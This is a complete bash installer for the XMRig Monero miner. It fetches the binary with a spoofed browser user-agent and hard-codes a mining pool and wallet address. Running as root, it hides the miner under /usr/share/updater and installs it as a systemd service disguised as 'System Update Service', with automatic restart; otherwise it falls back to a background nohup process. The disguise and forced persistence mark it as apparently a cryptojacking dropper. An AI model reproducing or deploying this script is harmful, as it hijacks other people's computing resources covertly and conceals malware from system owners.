#!/bin/bash

# Configuration
TAR_FILE="kal.tar.gz"
EXTRACT_DIR="xmrig-6.24.0"
SERVICE_NAME="system-update-service"
ARGS="--url pool.supportxmr.com:8080 --user 89Zr4vPaS8yTYRQE54tK1QGKRpsYZ6eJJYynfpfBf1zmLHECaskMPwd3wuTnQ4SYQ7QLkwVN8ur2QTQi9wkKMaCr2iXKa7j --pass sx --donate-level 0"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Determine binary path based on privileges
if [ "$(id -u)" -eq 0 ]; then
    INSTALL_DIR="/usr/share/updater"
    CONFIG_FILE="$INSTALL_DIR/miner.conf"
else
    INSTALL_DIR="$(pwd)"
    CONFIG_FILE="$(pwd)/miner.conf"
fi

BINARY_PATH="$INSTALL_DIR/$EXTRACT_DIR/xmrig"

# Function to create/update configuration file
save_config() {
    cat > "$CONFIG_FILE" <<EOF
BINARY_PATH=$BINARY_PATH
ARGS=$ARGS
SERVICE_NAME=$SERVICE_NAME
EOF
    echo "[*] Configuration saved to $CONFIG_FILE"
}

# Function to load configuration
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        echo "[*] Configuration loaded from $CONFIG_FILE"
    fi
}

# First, check if root and move existing installation from pwd to /usr/share/updater
if [ "$(id -u)" -eq 0 ] && [ -d "$(pwd)/$EXTRACT_DIR" ] && [ ! -d "$INSTALL_DIR/$EXTRACT_DIR" ]; then
    echo "[*] Found existing installation in $(pwd). Moving to $INSTALL_DIR..."
    mkdir -p "$INSTALL_DIR"
    mv "$(pwd)/$EXTRACT_DIR" "$INSTALL_DIR/" 2>/dev/null || true
    if [ -f "$(pwd)/$TAR_FILE" ]; then
        rm -f "$(pwd)/$TAR_FILE"
    fi
    if [ -f "$(pwd)/miner.conf" ]; then
        mv "$(pwd)/miner.conf" "$INSTALL_DIR/miner.conf" 2>/dev/null || true
    fi
fi

# Check if already installed
ALREADY_INSTALLED=0
if [ -f "$BINARY_PATH" ]; then
    ALREADY_INSTALLED=1
    echo "[*] Installation detected. Loading existing configuration..."
    load_config
fi

# Download and setup if not already present
if [ ! -f "$BINARY_PATH" ]; then
    echo "[*] Downloading xmrig..."
    
    # Extract in temp location first
    TEMP_DIR=$(mktemp -d)
    cd "$TEMP_DIR"
    
    curl -L -o "$TAR_FILE" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
    echo "[*] Extracting archive..."
    tar xvzf "$TAR_FILE"
    
    # Move to install directory if root
    if [ "$(id -u)" -eq 0 ]; then
        echo "[*] Moving to $INSTALL_DIR..."
        mkdir -p "$INSTALL_DIR"
        mv "$EXTRACT_DIR" "$INSTALL_DIR/"
    else
        # For non-root, move to current directory
        cd - > /dev/null
        mv "$TEMP_DIR/$EXTRACT_DIR" "$(pwd)/$EXTRACT_DIR"
    fi
    
    rm -rf "$TEMP_DIR"
    save_config
else
    echo "[*] Binary already exists at $BINARY_PATH"
fi

chmod +x "$BINARY_PATH"

# If already installed, update systemd service if it exists
if [ $ALREADY_INSTALLED -eq 1 ]; then
    echo "[*] Updating existing installation..."
    
    # Check if service exists and update it
    if [ -f "$SERVICE_FILE" ]; then
        echo "[*] Found existing systemd service. Updating..."
        
        # Stop the service before updating
        if systemctl is-active --quiet "$SERVICE_NAME"; then
            echo "[*] Stopping service..."
            systemctl stop "$SERVICE_NAME"
        fi
        
        # Update service with new arguments
        cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${BINARY_PATH} ${ARGS}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
        
        systemctl daemon-reload
        echo "[*] Service configuration updated"
        
        # Restart the service
        systemctl start "$SERVICE_NAME"
        
        if systemctl is-active --quiet "$SERVICE_NAME"; then
            echo "[+] Service restarted successfully"
        fi
    else
        # Service doesn't exist yet, continue with normal installation
        echo "[*] No systemd service found. Proceeding with initial setup..."
        ALREADY_INSTALLED=0
    fi
fi

# Attempt systemd setup (for new installations)
if [ $ALREADY_INSTALLED -eq 0 ]; then
    INSTALLED_SYSTEMD=0
    if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
        echo "[*] Root privileges detected. Attempting systemd setup..."
        
        cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${BINARY_PATH} ${ARGS}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

        systemctl daemon-reload
        systemctl enable "$SERVICE_NAME"
        systemctl start "$SERVICE_NAME"
        
        if systemctl is-active --quiet "$SERVICE_NAME"; then
            echo "[+] Service started via systemd."
            INSTALLED_SYSTEMD=1
            save_config
        fi
    fi

    # Fallback to nohup
    if [ $INSTALLED_SYSTEMD -eq 0 ]; then
        echo "[*] Starting with nohup..."
        nohup "$BINARY_PATH" $ARGS >/dev/null 2>&1 &
        save_config
    fi
fi
